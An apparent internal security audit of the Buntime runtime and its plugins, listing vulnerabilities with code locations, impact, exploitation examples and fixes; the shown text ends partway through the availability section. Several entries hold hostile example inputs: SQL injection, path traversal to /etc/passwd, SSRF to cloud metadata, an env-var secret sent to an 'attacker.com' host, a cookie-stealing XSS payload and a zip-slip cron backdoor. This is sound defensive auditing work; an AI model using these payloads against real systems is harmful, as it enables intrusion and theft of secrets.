# Vulnerabilities and Availability Issues

Security audit performed on 2026-01-12. This document tracks identified vulnerabilities and availability issues in the Buntime runtime and plugins.

## Status Legend

- [ ] Not started
- [x] Fixed
- [~] In progress

---

## Critical Vulnerabilities

### 1. SQL Injection - Database Plugin Table Names

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-database/server/api.ts`
**Lines:** 157, 177, 195, 229, 237-251

**Description:** Table names from user input (`ctx.req.param("name")`) are directly interpolated into SQL queries without validation or parameterization.

```typescript
// Line 157
`PRAGMA table_info("${tableName}")`

// Line 229
`SELECT COUNT(*) as count FROM "${tableName}"`

// Line 251
`SELECT ${selectColumns} FROM "${tableName}" LIMIT ${limit} OFFSET ${offset}`
```

**Impact:** Arbitrary SQL execution, data exfiltration, potential database takeover.

**Exploitation:** `GET /database/api/tables/"; DROP TABLE users; --/schema`

**Fix:** Validate table name against allowed characters:
```typescript
if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(tableName)) {
  return ctx.json({ error: "Invalid table name" }, 400);
}
```

---

### 2. SQL Injection - SCIM Service Dynamic SQL

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-authn/server/scim/service.ts`
**Lines:** 102, 325, 336, 350

**Description:** SQL is constructed using template literals with unsanitized `expiresInDays` parameter and dynamic UPDATE field lists.

```typescript
// Line 102-105
const expiresAt = expiresInDays ? `datetime('now', '+${expiresInDays} days')` : null;
await this.adapter.execute(
  `INSERT INTO scim_token (...) VALUES (?, ?, ?, ${expiresAt ?? "NULL"})`,
  [id, name, hash],
);
```

**Impact:** SQL injection through malicious `expiresInDays` values or PATCH operations.

**Fix:** Always use parameterized queries:
```typescript
const sql = `INSERT INTO scim_token (...) VALUES (?, ?, ?, datetime('now', ?))`;
const params = [id, name, hash, `+${expiresInDays} days`];
```

---

### 3. SQL Injection - SCIM Filter Parser

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-authn/server/scim/filter.ts`
**Lines:** 436, 440

**Description:** `sortColumn` from `sortBy` attribute is directly interpolated into SQL without validation.

```typescript
const sortColumn = sortBy ? (attributeMap[sortBy] ?? "id") : "id";
const sql = `SELECT * FROM ${table} WHERE ${where} ORDER BY ${sortColumn} ${sortDir} LIMIT ? OFFSET ?`;
```

**Impact:** SQL injection via malicious `sortBy` parameter if attribute mapping is bypassed.

**Fix:** Whitelist `sortColumn` values against `Object.values(attributeMap)`.

---

### 4. Complete Tenant Isolation Bypass - KeyVal Plugin

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-keyval/server/services.ts`
**Line:** 36

**Description:** The KeyVal plugin uses `database.getRootAdapter()` instead of tenant-scoped adapters, completely bypassing tenant isolation. All workers/apps share the same KV store without any separation.

```typescript
// services.ts:36
adapter = database.getRootAdapter(config.adapterType);
```

**Impact:**
- Any worker can read/write/delete data from any other worker's namespace
- Complete tenant isolation bypass - Worker A can access Worker B's data
- Cross-tenant data leakage in multi-tenant deployments

**Fix:** Use tenant-scoped adapters per request/worker context:
```typescript
adapter = await database.getAdapter(config.adapterType, tenantId);
```

---

### 5. SQL Injection - FTS Search Query

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-keyval/server/lib/fts.ts`
**Line:** 197

**Description:** FTS5 MATCH clause is constructed by string concatenation without proper escaping.

```typescript
// fts.ts:197
const fieldQueries = index.fields.map((field) => `${field}:${query}`).join(" OR ");
await this.adapter.execute<{ doc_key: string }>(
  `SELECT doc_key FROM ${index.tableName} WHERE ${index.tableName} MATCH ? LIMIT ?`,
  [fieldQueries, limit],  // fieldQueries contains unsanitized user input
);
```

**Impact:** Attacker can bypass search restrictions, extract all documents, or cause DoS with expensive FTS queries.

**Exploitation:** `kv.search(["posts"], "\" OR title:* OR \"", { limit: 1000 })`

**Fix:** Escape FTS5 special characters (`:`, `*`, `"`, `OR`, `AND`, `NOT`, `NEAR`) before interpolation.

---

### 6. Timing Attack on API Key Validation

**Status:** [ ] Not started
**Severity:** Critical
**File:** `runtime/src/libs/api-keys.ts`
**Lines:** 336-389

**Description:** API key validation reveals timing information through early returns and database queries:

```typescript
// Root key check - timing reveals if key matches root (line 339)
if (config.rootKey && key === config.rootKey) {
  return { id: null, name: "root", permissions: [], role: "root" };
}

// Prefix check reveals key format (line 349)
if (!key.startsWith(KEY_PREFIX)) {
  return null;
}

// Database query timing reveals if prefix exists (line 356)
const rows = await query<ApiKeyRow>("SELECT * FROM api_keys WHERE key_prefix = ?", [keyPrefix]);
```

**Impact:** Attackers can enumerate valid key prefixes and distinguish root key from database keys.

**Fix:** Implement constant-time validation with consistent database queries regardless of key validity.

---

### 7. Timing Attack on Authn API Key Comparison

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-authn/plugin.ts`
**Line:** 356

**Description:** API key comparison uses standard equality operator instead of constant-time comparison.

```typescript
const keyConfig = apiKeys.find((k) => k.key === apiKeyHeader);
```

**Impact:** Attackers can use timing side-channel attacks to brute-force API keys character by character.

**Fix:** Implement constant-time comparison using `crypto.timingSafeEqual()`.

---

### 8. Weak Key Generation Entropy

**Status:** [ ] Not started
**Severity:** Critical
**File:** `runtime/src/libs/api-keys.ts`
**Lines:** 157-163

**Description:** Key generation uses `Math.random()` which is not cryptographically secure:

```typescript
function generateKey(): string {
  const randomPart = Array.from(
    { length: KEY_LENGTH },
    () => KEY_CHARS[Math.floor(Math.random() * KEY_CHARS.length)],  // Line 160
  ).join("");
  return `${KEY_PREFIX}${randomPart}`;
}
```

**Impact:** If an attacker can observe multiple generated keys, they may predict the PRNG state.

**Fix:** Use `crypto.getRandomValues()` for cryptographically secure random generation.

---

## High Severity Vulnerabilities

### 9. ReDoS - AuthZ Plugin Pattern Matching

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-authz/server/pdp.ts`
**Lines:** 72-73, 112, 130-131, 139-140

**Description:** User-controlled patterns are converted to regex without validation, enabling catastrophic backtracking attacks.

```typescript
const pattern = match.role.replace(/\*/g, ".*");
const regex = new RegExp(`^${pattern}$`);
```

**Impact:** CPU exhaustion, service disruption.

**Exploitation:** `{ "role": "a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b" }` with input `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaac"` causes exponential backtracking.

**Fix:** Use safe-regex library or add pattern timeout.

---

### 10. ReDoS - Proxy Plugin Pattern Compilation

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/services.ts`
**Line:** 144

**Description:** User-provided regex patterns in proxy rules are compiled without validation.

```typescript
regex: new RegExp(rule.pattern),
```

**Impact:** CPU exhaustion from malicious proxy rule patterns.

**Fix:** Validate patterns with safe-regex before compilation.

---

### 11. ReDoS - Gateway Cache Invalidation API

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-gateway/server/api.ts`
**Line:** 37

**Description:** Cache invalidation endpoint accepts arbitrary regex patterns from user input without validation.

```typescript
.post("/cache/invalidate", async (ctx) => {
  const body = await ctx.req.json<{ pattern?: string; key?: string }>();
  if (body.pattern) {
    const count = cache.invalidatePattern(new RegExp(body.pattern)); // VULNERABLE
    return ctx.json({ invalidated: count });
  }
```

**Impact:** Denial of Service - server CPU usage spikes to 100%, blocking all requests.

**Fix:** Sanitize/validate regex patterns, use safe regex matcher with timeouts.

---

### 12. SSRF - LibSQL Adapter Tenant Operations

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-database/server/adapters/libsql.ts`
**Lines:** 209-210

**Description:** `tenantId` is directly interpolated into URL without validation, allowing path traversal or SSRF.

```typescript
const response = await fetch(`${this.primaryUrl}/v1/namespaces/${tenantId}`, { ... });
```

**Impact:** SSRF to internal services, path traversal.

**Exploitation:** `tenantId = "../../../admin"` or `tenantId = "../../@localhost:6379/CONFIG"`

**Fix:** Validate tenant ID format:
```typescript
if (!/^[a-zA-Z0-9_-]+$/.test(tenantId)) {
  throw new Error("Invalid tenant ID");
}
```

---

### 13. IP Spoofing - Gateway Rate Limit Bypass

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-gateway/plugin.ts`
**Lines:** 15-20

**Description:** `getClientIp()` blindly trusts the `x-forwarded-for` header without validation.

```typescript
function getClientIp(req: Request): string {
  return (
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
    req.headers.get("x-real-ip") ??
    "unknown"
  );
}
```

**Impact:** Complete bypass of IP-based rate limiting.

**Exploitation:** Send different `X-Forwarded-For` values on each request to get fresh rate limit buckets.

**Fix:** Use actual connection IP from the runtime/server, validate against trusted proxy list.

---

### 14. Open Redirect - Authn Logout Endpoint

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-authn/server/api.ts`
**Lines:** 83-91

**Description:** The logout endpoint accepts an arbitrary `redirect` parameter without validation.

```typescript
const redirect = ctx.req.query("redirect") || "/";
return ctx.redirect(redirect);
```

**Impact:** Attackers can craft URLs like `/auth/api/logout?redirect=https://evil.com` to redirect users to phishing sites.

**Fix:** Validate that redirect URLs are relative paths or match trusted origins.

---

### 15. Missing Authorization on Critical Endpoints

**Status:** [ ] Not started
**Severity:** High
**Files:** Multiple plugins

**Affected Endpoints:**
| Endpoint | Plugin | Issue |
|----------|--------|-------|
| `/database/api/query` | plugin-database | Arbitrary SQL execution without auth |
| `/logs/api/clear` | plugin-logs | Log deletion without auth |
| `/gateway/api/cache/invalidate` | plugin-gateway | Cache manipulation without auth |
| `/deployments/api/*` | plugin-deployments | File/directory access without auth |
| `/keyval/api/queue/dlq/:id/requeue` | plugin-keyval | DLQ message requeue without auth |

**Impact:** Unauthorized data access, service disruption.

**Fix:** Add authentication middleware to all sensitive routes.

---

### 16. Path Traversal - Deployments Plugin

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-deployments/server/api.ts`
**Lines:** 79-95

**Description:** `resolvePath()` function doesn't validate against directory traversal sequences.

```typescript
const parts = path.split("/");
const rootName = parts[0] ?? "";
const relativePath = parts.slice(1).join("/");
```

**Impact:** Access to files outside allowed directories.

**Exploitation:** `GET /deployments/api/list?path=../../etc/passwd`

**Fix:** Canonicalize paths and validate they're within allowed roots.

---

### 17. Path Traversal - Worker Wrapper (Windows)

**Status:** [ ] Not started
**Severity:** High
**File:** `runtime/src/libs/pool/wrapper.ts`
**Line:** 77

**Description:** Path traversal protection uses `startsWith()` which is vulnerable on Windows due to case-insensitive paths.

```typescript
const resolvedEntry = resolve(APP_DIR, ENTRYPOINT);
if (!resolvedEntry.startsWith(APP_DIR)) {
  throw new Error(`Security: Entrypoint "${ENTRYPOINT}" escapes app directory`);
}
```

**Impact:** On Windows, mixed case or separators can bypass the check.

**Fix:** Normalize paths and use proper case-insensitive comparison on Windows.

---

### 18. Cache Poisoning - Gateway Host Header

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-gateway/server/cache.ts`
**Lines:** 25-28

**Description:** Cache key generation uses `req.url` which includes the Host header.

```typescript
getKey(req: Request): string {
  const url = new URL(req.url);
  return `${req.method}:${url.pathname}${url.search}`;
}
```

**Impact:** Attacker can poison cache by sending requests with malicious Host headers.

**Fix:** Validate Host header against allowlist, use only pathname for cache key.

---

### 19. Transaction Race Condition - KeyVal Atomic Operations

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-keyval/server/lib/atomic.ts`
**Lines:** 179-198

**Description:** Version checks are sequential, not atomic. Between checking versionstamps and committing writes, another transaction can modify the same keys.

```typescript
for (const check of this.checks) {
  const encodedKey = encodeKey(check.key);
  const row = await this.adapter.executeOne<{ versionstamp: string }>(
    "SELECT versionstamp FROM kv_entries WHERE key = ? ...",
    [encodedKey],
  );
  // Time-of-check vs time-of-use gap here
  // ... validation ...
}
// Writes happen later in adapter.batch()
await this.adapter.batch(statements);
```

**Impact:** Lost updates in concurrent transactions, race conditions in financial operations.

**Fix:** Use proper database transactions for version checks + writes atomically.

---

### 20. OIDC Discovery Not Validated

**Status:** [ ] Not started
**Severity:** High
**Files:** `plugins/plugin-authn/server/providers/auth0.ts`, `okta.ts`, `keycloak.ts`, `generic-oidc.ts`
**Lines:** 18, 18, 72, 13 respectively

**Description:** All providers fetch OIDC discovery documents without validating response integrity, HTTPS enforcement, or content validation.

```typescript
const res = await fetch(`${issuerUrl}/.well-known/openid-configuration`);
if (!res.ok) throw new Error(`Failed to fetch OIDC discovery: ${res.status}`);
const doc = (await res.json()) as Record<string, unknown>;
```

**Impact:** Man-in-the-middle attacks, cache poisoning, redirect to attacker-controlled endpoints.

**Fix:** Enforce HTTPS, validate discovery document structure and required fields.

---

## Medium Severity Vulnerabilities

### 21. Regex Injection - AuthZ Claim Matching

**Status:** [ ] Not started
**Severity:** Medium
**File:** `plugins/plugin-authz/server/pdp.ts`
**Line:** 112

**Description:** The `regex` operator directly passes user-controlled strings to `new RegExp()`.

```typescript
case "regex":
  return typeof actual === "string" && new RegExp(expected as string).test(actual);
```

**Impact:** ReDoS attacks or regex syntax errors crashing policy evaluation.

**Fix:** Validate patterns with safe-regex before compilation.

---

### 22. CIDR Matching Not Implemented - AuthZ

**Status:** [ ] Not started
**Severity:** Medium
**File:** `plugins/plugin-authz/server/pdp.ts`
**Lines:** 237-251

**Description:** CIDR matching is documented but not implemented, silently returns true for all IPs.

```typescript
// CIDR matching would require IP parsing
// Simplified: skip CIDR for now
return true;
```

**Impact:** Policies relying on CIDR restrictions are completely bypassed.

**Fix:** Implement CIDR matching or reject policies using it.

---

### 23. Key Prefix Collision Enables Enumeration

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/api-keys.ts`
**Lines:** 354-386

**Description:** Key prefix (8 random base62 characters) creates collision risk with birthday paradox.

**Impact:** With ~15.7 million keys, 50% chance of prefix collision. Enables enumeration via timing attacks.

**Fix:** Increase prefix length to at least 16-20 characters or use full key hash for lookups.

---

### 24. Missing Rate Limiting on API Key Validation

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/app.ts`
**Lines:** 407-411, 495-500

**Description:** API key validation has no rate limiting or brute force protection.

**Impact:** Unlimited validation attempts allow brute force attacks.

**Fix:** Implement rate limiting per IP/source with exponential backoff and alerting.

---

### 25. Audit Log Tampering

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/audit.ts`
**Lines:** 120-149

**Description:** Audit logs stored without integrity protection - no signatures, no append-only structure.

**Impact:** Compromised admin can delete audit logs to cover tracks.

**Fix:** Implement append-only log storage with cryptographic signatures.

---

### 26. Worker ID Exposure

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/instance.ts`
**Line:** 92

**Description:** Workers receive unique ID via `WORKER_ID` environment variable.

```typescript
this.worker = new Worker(WORKER_PATH, {
  env: {
    ...safeEnv,
    WORKER_ID: this.id,  // Exposed to worker code
  },
});
```

**Impact:** Malicious code can track worker reuse patterns and correlate requests.

**Fix:** Remove `WORKER_ID` from worker environment unless needed for debugging.

---

### 27. Auto-Install Executes Arbitrary Code

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/wrapper.ts`
**Lines:** 84-94

**Description:** `autoInstall` runs `bun install` which can execute package lifecycle scripts.

**Impact:** Attacker with APP_DIR access can modify package.json to execute malicious code.

**Fix:** Disable `autoInstall` in production or validate lockfile signature before install.

---

### 28. Environment Variable Filtering Incomplete

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/pool/instance.ts`
**Lines:** 16-27

**Description:** Sensitive env patterns miss several common secrets:

```typescript
const SensitiveEnvPatterns = [
  /^(DATABASE|DB)_/i,
  /^(API|AUTH|SECRET|PRIVATE)_?KEY/i,
  /_TOKEN$/i,
  // Missing: SESSION_SECRET, JWT_SECRET, ENCRYPTION_KEY, etc.
];
```

**Impact:** Secrets may leak to worker code.

**Fix:** Add comprehensive patterns or use allowlist instead of blocklist.

---

### 29. Watch/SSE Denial of Service - KeyVal

**Status:** [ ] Not started
**Severity:** Medium
**File:** `plugins/plugin-keyval/server/index.ts`
**Lines:** 432-614

**Description:** Watch endpoints have no connection limits and poll at 100ms intervals.

**Impact:** Attacker can open thousands of SSE connections, overwhelming the database.

**Fix:** Add connection limits per client, rate limiting, and backpressure.

---

### 30. No Maximum Value Size - KeyVal

**Status:** [ ] Not started
**Severity:** Medium
**File:** `plugins/plugin-keyval/server/lib/kv.ts`
**Lines:** 307-344

**Description:** Values are serialized without size checks.

**Impact:** Attacker can store multi-GB blobs causing database bloat.

**Fix:** Add max value size (e.g., 10MB) and reject larger payloads.

---

### 31. SSRF via Unrestricted Proxy Targets

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-proxy/server/services.ts`
**Lines:** 187-190, 294-296

**Description:** The proxy plugin allows arbitrary target URLs without validation or allowlisting. Attackers with rule creation access can target internal services.

```typescript
// services.ts:189
const targetUrl = new URL(path, rule.target);
```

**Impact:**
- Access internal services (localhost, 127.0.0.1, 10.x.x.x, 192.168.x.x)
- Access cloud metadata services (169.254.169.254)
- Scan internal networks, bypass firewalls

**Exploitation:**
```json
POST /api/rules
{ "pattern": "^/meta/(.*)$", "target": "http://169.254.169.254", "rewrite": "/latest/meta-data/$1" }
```

**Fix:** Implement URL allowlisting and block private IP ranges (RFC 1918, loopback, link-local, metadata).

---

### 32. Header Injection via Proxy Custom Headers

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-proxy/server/services.ts`
**Lines:** 215-220

**Description:** Proxy rules accept arbitrary headers without sanitization, enabling CRLF injection and header smuggling.

```typescript
if (rule.headers) {
  for (const [key, value] of Object.entries(rule.headers)) {
    headers.set(key, value);  // No validation
  }
}
```

**Impact:** Response splitting, cache poisoning, authentication bypass.

**Exploitation:**
```json
{ "headers": { "X-Forwarded-For": "attacker.com\r\nX-Admin: true" } }
```

**Fix:** Validate header keys against RFC 7230, reject CRLF sequences.

---

### 33. Path Traversal in File Upload

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-deployments/server/api.ts`
**Line:** 248
**Related:** `plugins/plugin-deployments/server/libs/dir-info.ts` Line 378-379

**Description:** Upload endpoint accepts user-controlled `paths` parameter from FormData, passed directly to `writeFile()` without path traversal validation.

```typescript
// api.ts:248
const fileRelativePath = paths[i] || file.name;
await dir.writeFile(fileRelativePath, content);

// dir-info.ts:379
const filePath = join(this.fullPath, fileName);  // No validation
```

**Impact:** Arbitrary file write anywhere on filesystem (within process permissions).

**Exploitation:**
```javascript
formData.append("paths", "../../../../tmp/pwned.txt");
```

**Fix:** Validate resolved path stays within `baseDir`:
```typescript
const filePath = resolve(this.fullPath, normalizedName);
if (!filePath.startsWith(this.fullPath + '/')) {
  throw new Error("Path traversal attempt detected");
}
```

---

### 34. Zip Slip Vulnerability

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-deployments/server/libs/dir-info.ts`
**Lines:** 117-123

**Description:** ZIP extraction uses `unzip -o` without validating archive contents for path traversal sequences.

```typescript
const proc = Bun.spawn(["unzip", "-o", "-q", tempFile, "-d", this.fullPath]);
```

**Impact:** Arbitrary file write via malicious ZIP archives containing `../` paths.

**Exploitation:** Create ZIP with entries like `../../../../etc/cron.d/backdoor`.

**Fix:** List and validate ZIP contents before extraction:
```typescript
const listProc = Bun.spawn(["unzip", "-l", tempZip], { stdout: "pipe" });
const output = await new Response(listProc.stdout).text();
if (output.match(/\.\.\//)) {
  throw new Error("Malicious ZIP: path traversal detected");
}
```

---

### 35. HTML Injection via Proxy Base Tag

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/services.ts`
**Lines:** 249-253

**Description:** Base tag injection doesn't sanitize the `base` value, enabling XSS.

```typescript
if (rule.base) {
  const baseHref = rule.base.endsWith("/") ? rule.base : `${rule.base}/`;
  html = html.replace("<head>", `<head><base href="${baseHref}" />`);
}
```

**Impact:** XSS, session hijacking, credential theft.

**Exploitation:**
```json
{ "base": "\"><script>alert(document.cookie)</script><a href=\"" }
```

**Fix:** HTML-encode the base value before injection.

---

### 36. Missing Authentication on Proxy API

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/api.ts`
**Lines:** 18-175 (all endpoints)

**Description:** Proxy management API has no authentication. Anyone reaching the API can list, create, modify, or delete proxy rules.

**Impact:** Complete proxy configuration takeover, SSRF via rule creation.

**Fix:** Add authentication middleware to all proxy API endpoints.

---

### 37. WebSocket Resource Exhaustion

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/services.ts`
**Lines:** 292-326

**Description:** WebSocket proxy creates outbound connections without limits, timeouts, or rate limiting.

**Impact:** DoS via connection exhaustion. 10,000 client connections = 10,000 backend connections.

**Fix:** Implement connection limits per target, idle timeouts, and rate limiting on upgrades.

---

### 38. Environment Variable Exposure via Proxy

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-proxy/server/services.ts`
**Line:** 145

**Description:** `substituteEnvVars()` expands `${VAR}` in target URLs. Combined with API info disclosure, attackers can probe env vars.

```typescript
target: substituteEnvVars(rule.target),
```

**Impact:** Environment variable disclosure via probing.

**Exploitation:**
```json
POST /api/rules
{ "target": "http://attacker.com/${DATABASE_PASSWORD}" }
GET /api/rules  // Response shows expanded value
```

**Fix:** Use allowlist for which env vars can be substituted, never expose in API responses.

---

### 39. Symlink Following in Downloads

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-deployments/server/api.ts`
**Lines:** 309-327

**Description:** Download endpoint uses `stat()` which follows symlinks, allowing access to files outside deployment directory.

**Impact:** Arbitrary file read via symlinks.

**Exploitation:**
```bash
ln -s /etc/passwd exposed.txt
GET /api/download?path=apps/myapp/exposed.txt  # Returns /etc/passwd
```

**Fix:** Use `lstat()` and reject symlinks:
```typescript
const stats = await lstat(fullPath);
if (stats.isSymbolicLink()) throw new Error("Symlinks not allowed");
```

---

### 40. TOCTOU Race Condition in Move

**Status:** [ ] Not started
**Severity:** Medium
**File:** `plugins/plugin-deployments/server/libs/dir-info.ts`
**Lines:** 276-292

**Description:** Move operation has time-of-check-time-of-use race between `stat()` check and `mv` command.

**Impact:** Overwrite arbitrary files via race condition (requires precise timing).

**Fix:** Use atomic `rename()` syscall instead of spawning `mv`.

---

### 41. Missing Rate Limiting on Key Creation

**Status:** [ ] Not started
**Severity:** High
**File:** `runtime/src/routes/keys-core.ts`
**Lines:** 182-264

**Description:** API key creation endpoint lacks rate limiting, enabling DoS via expensive bcrypt operations.

**Impact:** CPU exhaustion via mass key creation requests.

**Fix:** Implement rate limiting (10 requests/minute per IP).

---

### 42. Missing Host Header Validation

**Status:** [ ] Not started
**Severity:** High
**File:** `runtime/src/app.ts`
**Lines:** 510-546

**Description:** CSRF check validates Origin matches Host, but Host header itself is untrusted. Attacker can set both to bypass.

**Impact:** Password reset poisoning, OAuth token theft, cache poisoning.

**Exploitation:**
```
Host: evil.com
Origin: http://evil.com
```

**Fix:** Validate Host header against configured allowlist:
```typescript
const ALLOWED_HOSTS = ["localhost:8000", "example.com"];
if (host && !ALLOWED_HOSTS.includes(host)) {
  return new Response("Invalid Host", { status: 400 });
}
```

---

### 43. Unsafe JSON Parsing from Database

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/libs/database.ts`
**Lines:** 276, 278, 281, 283, 285, 543

**Description:** Multiple `JSON.parse()` calls without try-catch. Malformed JSON in database causes crash.

**Impact:** DoS via application crash.

**Fix:** Use safe wrapper with fallback:
```typescript
function safeJsonParse<T>(json: string, fallback: T): T {
  try { return JSON.parse(json); }
  catch { logger.error("JSON parse error"); return fallback; }
}
```

---

### 44. Insufficient Plugin Name Validation

**Status:** [ ] Not started
**Severity:** Medium
**File:** `runtime/src/routes/config-core.ts`
**Lines:** 96, 114, 146, 161, 173, 197, 214

**Description:** Plugin names decoded with `decodeURIComponent()` but not validated, enabling path traversal.

**Impact:** Path traversal if names used in filesystem operations.

**Exploitation:** `/api/core/config/plugins/../../etc/passwd/version`

**Fix:** Validate against strict pattern:
```typescript
if (!/^[@a-z0-9_-]+$/i.test(name) || name.includes("..")) {
  throw new ValidationError("Invalid plugin name", "INVALID_NAME");
}
```

---

### 45. Plaintext Token Storage - CLI

**Status:** [ ] Not started
**Severity:** Critical
**File:** `packages/cli/src/lib/config-db.ts`
**Lines:** 60, 102, 135, 168, 182, 209

**Description:** Authentication tokens stored in plaintext in SQLite database at `~/.buntime/config.db`.

```typescript
// Line 60 - Schema
token TEXT,
// Line 182 - Storage
[data.name, data.url, data.token ?? null, data.insecure ? 1 : 0],
```

**Impact:** Any process with read access to `~/.buntime/config.db` can extract all authentication tokens.

**Fix:** Use OS-level credential managers (Keychain on macOS, Credential Manager on Windows, Secret Service on Linux) or encryption at rest.

---

### 46. Path Traversal - Static Handler

**Status:** [ ] Not started
**Severity:** Critical
**File:** `packages/shared/src/utils/static-handler.ts`
**Lines:** 22-24

**Description:** URL pathname directly joined with baseDir without normalization.

```typescript
const path = new URL(req.url).pathname;
const name = path !== "/" ? path : "index.html";
const file = Bun.file(join(baseDir, name));
```

**Impact:** Directory traversal allows reading arbitrary files.

**Exploitation:** `GET /../../../etc/passwd`

**Fix:** Normalize paths and validate they stay within baseDir:
```typescript
const fullPath = resolve(baseDir, normalize(name));
if (!fullPath.startsWith(resolve(baseDir) + "/")) {
  return new Response("Forbidden", { status: 403 });
}
```

---

### 47. Missing Authorization - Metrics Plugin

**Status:** [ ] Not started
**Severity:** Critical
**File:** `plugins/plugin-metrics/server/api.ts`
**Lines:** 20-54

**Description:** All metrics endpoints are unauthenticated:
- `GET /metrics/api/` - JSON metrics
- `GET /metrics/api/prometheus` - Prometheus format
- `GET /metrics/api/sse` - Real-time SSE stream
- `GET /metrics/api/stats` - Pool and worker statistics

**Impact:**
- Information disclosure of system metrics
- Application enumeration via worker keys (app-name@version)
- Performance profiling enables attack timing

**Fix:** Add authentication middleware to all metrics API endpoints.

---

### 48. Token Exposure via CLI Arguments

**Status:** [ ] Not started
**Severity:** High
**File:** `packages/cli/src/index.tsx`
**Lines:** 29, 53, 64, 87, 98

**Description:** Tokens can be passed via `--token` CLI argument, visible in `ps aux`.

**Impact:** Any user on multi-user systems can see tokens passed via CLI.

**Fix:** Remove `--token` option. Force users to use environment variables (`BUNTIME_TOKEN`) or interactive prompts.

---

### 49. Global TLS Certificate Bypass - CLI

**Status:** [ ] Not started
**Severity:** High
**File:** `packages/cli/src/lib/config-db.ts`
**Lines:** 61, 99, 132, 165, 182, 213

**Description:** The `insecure` flag sets `NODE_TLS_REJECT_UNAUTHORIZED=0` globally.

**Impact:** Once set, affects ALL HTTPS connections, not just Buntime server, enabling MITM on third-party APIs.

**Fix:** Use per-request TLS configuration via fetch's `agent` option.

---

### 50. ReDoS - JSONC Parser

**Status:** [ ] Not started
**Severity:** High
**File:** `packages/shared/src/utils/buntime-config.ts`
**Line:** 18

**Description:** Regex for stripping comments uses negative lookbehind with unbounded quantifiers.

```typescript
const withoutSingleLine = content.replace(/(?<![:\\"'])\\/\\/(?![:\\"']).*/gm, "");
```

**Impact:** DoS via catastrophic backtracking with crafted manifest.jsonc.

**Fix:** Use proper JSONC parser library (jsonc-parser, strip-json-comments).

---

### 51. Information Disclosure - Worker Stats

**Status:** [ ] Not started
**Severity:** High
**File:** `runtime/src/libs/pool/pool.ts`
**Lines:** 179-212

**Description:** Worker keys expose application names and versions (format: `app-name@version`).

**Impact:** Reveals internal application portfolio and version information.

**Fix:** Add authentication to metrics endpoints, consider hashing worker keys.

---

### 52. SSE Endpoint DoS - Metrics

**Status:** [ ] Not started
**Severity:** High
**File:** `plugins/plugin-metrics/server/api.ts`
**Lines:** 38-46

**Description:** SSE endpoint runs infinite loop without connection limits, auth, or rate limiting.

**Impact:** Resource exhaustion via unlimited connections.

**Fix:** Add authentication, connection limits per IP, timeouts, and max concurrent connections.

---

### 53. URL Injection - KeyVal Client

**Status:** [ ] Not started
**Severity:** Medium
**File:** `packages/keyval/src/keyval.ts`
**Lines:** 1930-1944

**Description:** `encodeKeyPart()` doesn't strictly validate types. Objects with custom `toString()` could inject paths.

**Impact:** URL manipulation or path traversal via malicious key parts.

**Fix:** Add strict type validation and reject objects with custom toString.

---

### 54. Weak Database File Permissions - CLI

**Status:** [ ] Not started
**Severity:** Medium
**File:** `packages/cli/src/lib/config-db.ts`
**Lines:** 41-45

**Description:** Database file created with default permissions (typically 0644).

**Impact:** Other users on system can read database containing plaintext tokens.

**Fix:** Set restrictive permissions:
```typescript
mkdirSync(CONFIG_DIR, { recursive: true, mode: 0o700 });
chmodSync(DB_PATH, 0o600);
```

---

### 55. Missing JSON Payload Validation - KeyVal Client

**Status:** [ ] Not started
**Severity:** Medium
**File:** `packages/keyval/src/keyval.ts`
**Lines:** 645, 715, 737, 804

**Description:** User-provided values serialized without validation of structure or size.

**Impact:** Prototype pollution or DoS via deeply nested objects.

**Fix:** Add payload validation for size and nesting depth.

---

---

## Availability Issues

### 1. Database Initialization Without Timeout

**Status:** [ ] Not started
**Severity:** Critical
**File:** `runtime/src/api.ts`
**Line:** 41

**Description:** `await initDatabase()` has no timeout. If libSQL connection hangs, the entire runtime freezes during startup.

**Impact:** Server never starts if DB is unreachable, network timeout, or auth fails.

**Fix:**
```typescript
const DB_INIT_TIMEOUT = 30_000;
await Promise.race([
  initDatabase(),
  new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Database init timeout')), DB_INIT_TIMEOUT)
  )
]);
```

---

### 2. Plugin Loader Without Timeout

**Status:** [ ] Not started
**Severity:** Critical
**File:** `runtime/src/api.ts`
**Line:** 55

**Description:** `await loader.load()` has no overall timeout. The per-plugin timeout only covers `onInit`, not scan/import phase.

**Impact:** Server never starts if plugin scanning/loading hangs.

